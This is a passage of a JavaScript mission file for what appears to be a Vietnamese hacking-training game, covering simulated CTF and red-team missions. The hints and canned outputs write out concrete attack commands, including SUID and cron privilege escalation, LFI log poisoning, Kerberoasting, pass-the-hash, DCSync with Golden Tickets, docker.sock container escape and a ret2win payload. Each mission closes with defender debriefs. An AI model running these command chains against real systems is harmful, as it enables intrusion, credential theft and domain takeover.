        'Từ www-data dùng SUID nmap: `nmap --interactive` rồi `!sh` (GTFOBins) để thành root, `cat /root/flag.txt` -> FLAG{ftp_upload_rce_suid_nmap}.',
      ],
      initialFilesystem: fsC8M2,
    },
    {
      id: 3,
      chapterId: 8,
      title: 'CTF Hard — Full chain',
      story:
        'Bài cuối, không hint thật. Domain mega-corp.com black-box. Chuỗi đầy đủ: OSINT → subdomain → LFI trên index.php → log poisoning lấy RCE → cron privesc qua /opt/maint/run.sh → root → flag.',
      steps: [
        { id: 'recon', description: 'OSINT + enumerate subdomain để tìm web vào được', match: /^(subfinder|amass|nmap|gobuster)\b|crt\.sh/, output: 'Found subdomain dev.mega-corp.com -> serves index.php?page=... (possible LFI).' },
        { id: 'lfi_rce', description: 'Khai thác LFI + log poisoning để có RCE', match: /\?page=|include|access\.log|user-agent|poison/i, output: 'LFI include /var/log/apache2/access.log + inject PHP qua User-Agent -> RCE as www-data.' },
        { id: 'privesc', description: 'Leo root qua cron job world-writable (/opt/maint/run.sh)', match: /cron|run\.sh|chmod\s+\+s|cp\s+\/bin\/bash/, output: 'Root cron runs /opt/maint/run.sh (world-writable) -> append SUID payload -> /tmp/rb -p -> root.' },
        { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
      ],
      hints: [
        'Bài cuối — tự lực là chính, dùng hint càng ít càng tốt. Gợi ý duy nhất ở cấp này: domain chính chưa chắc là nơi có lỗ hổng, mày có chắc đã thấy hết bề mặt tấn công chưa?',
        'Sau khi tìm được subdomain/endpoint chứa lỗ hổng: để ý tham số load nội dung trang (kiểu `?page=`) và log truy cập web server — 2 thứ này có thể kết hợp với nhau.',
        'LFI include `/var/log/apache2/access.log`, inject PHP vào User-Agent để log poisoning lấy RCE thành www-data; sau đó cron root chạy world-writable `/opt/maint/run.sh` — append `cp /bin/bash /tmp/rb && chmod +s /tmp/rb`, đợi cron, `/tmp/rb -p`, rồi `cat /root/flag.txt` -> FLAG{full_chain_lfi_logpoison_cron_root}.',
      ],
      initialFilesystem: fsC8M3,
    },
  ],
  9: [
    {
      id: 1,
      chapterId: 9,
      title: 'Kerberoasting',
      story:
        'Mày đã có một tài khoản domain user quèn (corp\\jdoe). Trong Active Directory, bất kỳ user nào cũng request được vé Kerberos (TGS) cho các tài khoản service có SPN — và vé đó mã hoá bằng hash mật khẩu của service account. Lấy vé, crack offline, có ngay mật khẩu service.',
      steps: [
        {
          id: 'enum_spn',
          description: 'Liệt kê các tài khoản có SPN và request TGS hash',
          match: /GetUserSPNs|getuserspns|-request\b/i,
          output: [
            'ServicePrincipalName        Name      MemberOf',
            '--------------------------  --------  ----------------',
            'MSSQLSvc/sql01.corp:1433    svc_sql   Domain Users',
            'HTTP/web01.corp             svc_web   Domain Users',
            '',
            '$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01...<hash truncated>...',
          ].join('\n'),
        },
        {
          id: 'crack',
          description: 'Crack TGS hash offline để lấy mật khẩu service',
          match: /hashcat\b.*13100|john\b.*krb5tgs|13100/i,
          output: '$krb5tgs$23$*svc_sql*...:Summer2024   <-- cracked! svc_sql : Summer2024',
        },
      ],
      hints: [
        'AD cho phép mọi user xin TGS cho tài khoản có SPN — đó là bề mặt tấn công.',
        'Dùng `impacket-GetUserSPNs corp.local/jdoe:Welcome1 -dc-ip 10.10.10.5 -request`.',
        'Lấy hash rồi crack: `hashcat -m 13100 hashes.txt rockyou.txt` -> svc_sql:Summer2024.',
      ],
      debrief: [
        'SPN (Service Principal Name) gắn tài khoản service với dịch vụ; bất kỳ domain user nào cũng query và xin được TGS cho nó — không cần quyền cao.',
        'Vé TGS mã hoá bằng NTLM hash mật khẩu của service account, nên crack offline được mà không gây ồn (không hề chạm DC sau khi đã có vé).',
        'Attacker săn service account vì chúng thường có mật khẩu yếu/đặt lâu không đổi và quyền cao (SQL, web app pool).',
        'DEFENDER: dùng gMSA (Group Managed Service Account) với mật khẩu 120+ ký tự auto-rotate; nếu buộc dùng tài khoản thường thì password 25+ ký tự ngẫu nhiên; giám sát Event ID 4769 với encryption type RC4 (0x17) bất thường.',
      ],
      initialFilesystem: fsC9M1,
    },
    {
      id: 2,
      chapterId: 9,
      title: 'Pass-the-Hash — Lan ngang',
      story:
        'svc_sql là local admin trên WS01. Nhưng mày không cần mật khẩu plaintext để nhảy sang máy khác — NTLM cho phép xác thực bằng chính cái hash. Dump hash, rồi Pass-the-Hash sang các host còn lại trong subnet.',
      steps: [
        {
          id: 'dump_hash',
          description: 'Dump NTLM hash từ máy đã chiếm',
          match: /secretsdump|mimikatz|sekurlsa|lsadump/i,
          output: 'Administrator:500:aad3b...:8846f7eaee8fb117ad06bdd830b7586c:::   <-- NTLM hash local admin',
        },
        {
          id: 'move',
          description: 'Pass-the-Hash sang host khác trong subnet',
          match: /crackmapexec\b.*-H|cme\b.*-H|psexec.*-hashes|pth-/i,
          output: [
            'SMB  10.10.10.22  445  WS02     [+] corp\\Administrator:8846f7...  (Pwn3d!)',
            'SMB  10.10.10.30  445  FILE01   [+] corp\\Administrator:8846f7...  (Pwn3d!)',
          ].join('\n'),
        },
      ],
      hints: [
        'NTLM xác thực bằng hash — không cần biết plaintext mật khẩu.',
        'Dump bằng `secretsdump.py` hoặc mimikatz `sekurlsa::logonpasswords`.',
        'Lan ngang: `crackmapexec smb 10.10.10.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c` -> tìm host trả về (Pwn3d!).',
      ],
      debrief: [
        'Pass-the-Hash lợi dụng việc NTLM dùng chính hash làm "thứ chứng minh danh tính" — không bao giờ cần crack ra plaintext.',
        'Một local admin password dùng chung trên nhiều máy = một hash mở toang cả subnet (lateral movement bùng nổ).',
        'Attacker ưu tiên dump LSASS để gom hash của mọi phiên đăng nhập còn nằm trong RAM, kể cả tài khoản cao hơn vừa login.',
        'DEFENDER: bật LAPS để mỗi máy có local admin password riêng & xoay vòng; bật SMB signing; bỏ tài khoản khỏi nhóm admin không cần thiết; Credential Guard để bảo vệ LSASS; giám sát đăng nhập NTLM type 3 bất thường giữa các workstation.',
      ],
      initialFilesystem: fsC9M2,
    },
    {
      id: 3,
      chapterId: 9,
      title: 'DCSync → Domain Admin',
      story:
        'Mày đã chiếm được tài khoản có quyền replication trên Domain Controller. Đòn kết liễu: giả làm một DC khác, yêu cầu nó "đồng bộ" cho mày toàn bộ hash — kể cả krbtgt. Có krbtgt là forge được Golden Ticket, thành Domain Admin vĩnh viễn.',
      steps: [
        {
          id: 'dcsync',
          description: 'DCSync để rút hash krbtgt từ DC',
          match: /secretsdump.*-just-dc|lsadump::dcsync|dcsync/i,
          output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fef74b9d33...:::   <-- hash krbtgt',
        },
        {
          id: 'golden',
          description: 'Forge Golden Ticket, leo lên Domain Admin',
          match: /ticketer|golden|kerberos::golden|mimikatz/i,
          output: 'Golden Ticket for Administrator@CORP.LOCAL forged -> injected -> uid=Domain Admin. Full domain control.',
        },
        { id: 'capture_flag', description: 'Đọc flag trên DC ở /root/.flag', match: /^cat\s+\/root\/\.flag/ },
      ],
      hints: [
        'Quyền replication (DS-Replication-Get-Changes) cho phép giả làm DC để xin hash.',
        'DCSync: `secretsdump.py corp.local/Administrator@10.10.10.5 -just-dc-user krbtgt`.',
        'Có krbtgt thì `ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain corp.local Administrator`, inject vé rồi `cat /root/.flag` -> FLAG{domain_admin_via_dcsync}.',
      ],
      debrief: [
        'DCSync lạm dụng giao thức replication hợp pháp giữa các DC (MS-DRSR) — không phải exploit, mà là tính năng bị dùng sai khi attacker có quyền replication.',
        'krbtgt là "chìa khoá vạn năng": hash của nó ký mọi TGT, nên forge Golden Ticket cho phép mạo danh bất kỳ ai, bỏ qua mật khẩu, tồn tại kể cả sau khi reset user.',
        'Đây là lý do reset krbtgt phải làm HAI LẦN (cách nhau) khi nghi bị xâm nhập — một lần không vô hiệu được vé cũ.',
        'DEFENDER: giới hạn quyền replication chỉ cho DC thật; mô hình tiered admin (Tier 0 cho DA, không đăng nhập DA xuống workstation); giám sát Event 4662 với GUID replication từ host không phải DC; phát hiện Golden Ticket qua vé có lifetime bất thường.',
      ],
      initialFilesystem: fsC9M3,
    },
  ],
  10: [
    {
      id: 1,
      chapterId: 10,
      title: 'Web → RCE → Container Escape',
      story:
        'Black-box, không hint, không nương tay. Một web app trên 10.10.20.10. Vào được shell mới phát hiện mày đang kẹt trong container — và phải thoát ra host thật mới chạm được cờ.',
      noHints: true,
      randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
      steps: [
        {
          id: 'recon_rce',
          description: 'Recon web app và lấy RCE (webshell)',
          match: /^(nmap|gobuster|ffuf|curl|wget)\b|upload|shell/i,
          output: 'Found an unfiltered upload endpoint -> drop a webshell -> RCE. `id` -> uid=33(www-data). But `/proc/1/cgroup` reveals: running inside a Docker container.',
        },
        {
          id: 'escape',
          description: 'Thoát container ra host root',
          match: /docker\.sock|--privileged|cgroup|nsenter|capsh|escape|mount/i,
          output: 'docker.sock is mounted into the container -> `docker run -v /:/host --privileged` -> chroot /host -> root on the real HOST.',
        },
        { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
      ],
      hints: ['Bài elite không có hint — tự lực.'],
      debrief: [
        'Container KHÔNG phải ranh giới bảo mật mạnh: mount sai (docker.sock, /, hostPath), cờ --privileged, hoặc capability dư (CAP_SYS_ADMIN) đều cho phép thoát ra host.',
        '`/proc/1/cgroup`, sự tồn tại của `/.dockerenv`, hay docker.sock là dấu hiệu đầu tiên attacker check để biết mình đang ở trong container.',
        'docker.sock = quyền điều khiển Docker daemon (chạy bằng root trên host) -> tạo container mới mount toàn bộ host = game over.',
        'DEFENDER: không bao giờ mount docker.sock vào container ứng dụng; chạy rootless/userns-remap; bỏ capability thừa, đặt seccomp/AppArmor; read-only rootfs; tách workload nhạy cảm sang VM thay vì chỉ container.',
      ],
      initialFilesystem: fsC10M1,
    },
    {
      id: 2,
      chapterId: 10,
      title: 'Binary Exploitation — ret2win',
      story:
        'Một service nhị phân lạ lắng nghe ở port 31337 trên 10.10.20.20. Không source, không hint. Mày phải tự đọc binary, tìm lỗ hổng tràn bộ đệm, và điều khiển luồng thực thi để có shell.',
      noHints: true,
      randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
      steps: [
        {
          id: 'analyze',
          description: 'Kiểm tra binary và tìm điểm yếu bảo vệ',
          match: /checksec|gdb|objdump|radare2|r2\b|ghidra|file\s/i,
          output: 'checksec: Canary=No  NX=Disabled  PIE=No  RELRO=Partial. Found win() at 0x4011d6. Buffer overflow is feasible.',
        },
        {
          id: 'exploit',
          description: 'Tìm offset, overflow ret2win để có shell',
          match: /pattern_create|cyclic|offset|ret2win|payload|struct\.pack|p64\(/i,
          output: 'Offset = 40 bytes to saved RIP -> payload `b"A"*40 + p64(0x4011d6)` -> jump into win() -> pop shell. `id` -> uid=1000.',
        },
        { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt (sau khi privesc)', match: /^cat\s+\/root\/flag\.txt/ },
      ],
      hints: ['Bài elite không có hint — tự lực.'],
      debrief: [
        'ret2win là dạng đơn giản nhất của control-flow hijack: ghi đè saved return address để CPU "trả về" vào một hàm có sẵn mình muốn, không cần shellcode.',
        'checksec đọc các mitigation: Stack Canary chặn overflow tuyến tính, NX chặn chạy code trên stack, PIE/ASLR ngẫu nhiên hoá địa chỉ — thiếu cái nào mở ra kỹ thuật tương ứng.',
        'Tìm offset chính xác (cyclic pattern) là bước then chốt: lệch 1 byte là crash thay vì kiểm soát được RIP.',
        'DEFENDER: bật toàn bộ mitigation (canary, NX, full RELRO, PIE+ASLR); fortify source; fuzzing để diệt overflow từ trong CI; tách dịch vụ chạy quyền thấp + seccomp để giảm impact nếu vẫn bị khai thác.',
      ],
      initialFilesystem: fsC10M2,
    },
    {
      id: 3,
      chapterId: 10,
      title: 'Red-Team Capstone',
      story:
        'Bài tốt nghiệp. Chỉ có một cái tên: globex.io. Không scope chi tiết, không hint, không ai đỡ. Đi từ OSINT, tìm đường vào, lan ngang qua Active Directory, và kết thúc bằng Domain Admin — đọc cờ cuối cùng.',
      noHints: true,
      randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
      steps: [
        {
          id: 'osint_foothold',
          description: 'OSINT tìm creds rò rỉ và lập foothold',
          match: /^(theharvester|whois|subfinder|amass|nmap)\b|crt\.sh|linkedin|breach|dehashed/i,
          output: 'OSINT: employee j.rivera appeared in an old breach -> password reuse on the globex VPN -> internal-network foothold as a domain user.',
        },
        {
          id: 'lateral_dcsync',
          description: 'Lan ngang qua AD tới quyền replication, rồi DCSync',
          match: /GetUserSPNs|secretsdump|crackmapexec|bloodhound|-H\b|dcsync|just-dc/i,
          output: 'BloodHound maps the path: jdoe -> Kerberoast svc_app -> PtH to ADMSRV -> seize an account with replication rights -> DCSync to pull krbtgt.',
        },
        {
          id: 'domain_admin',
          description: 'Forge Golden Ticket, lên Domain Admin',
          match: /ticketer|golden|mimikatz|inject/i,
          output: 'Golden Ticket -> Domain Admin on globex.local. Full control. Logged into the DC.',
        },
        { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
      ],
      hints: ['Bài elite không có hint — tự lực.'],
      debrief: [
        'Một cuộc red-team thật là CHUỖI, không phải một exploit: OSINT → initial access → lateral → privesc → domain dominance. Mắt xích yếu nhất (mật khẩu tái sử dụng từ breach) thường là cửa vào.',
        'Credential reuse + dữ liệu breach công khai khiến phần "hack" đôi khi chỉ là đăng nhập hợp lệ — đó là lý do giám sát đăng nhập bất thường quan trọng ngang vá lỗ hổng.',
        'BloodHound cho attacker thấy đường ngắn nhất tới Domain Admin qua quan hệ ACL/nhóm mà admin không nhận ra mình đã tạo.',
        'DEFENDER: MFA mọi lối vào (đặc biệt VPN); chặn password reuse + theo dõi credential leak; mô hình tiered admin + least privilege; chạy BloodHound từ phía thủ để tự tìm và cắt các attack path trước khi attacker làm.',
      ],
      initialFilesystem: fsC10M3,
    },
  ],
};

export function getMission(chapterId, missionId) {
  return missions[chapterId]?.find((m) => m.id === missionId) ?? null;
}

export function getMissionsForChapter(chapterId) {
  return missions[chapterId] ?? [];
}
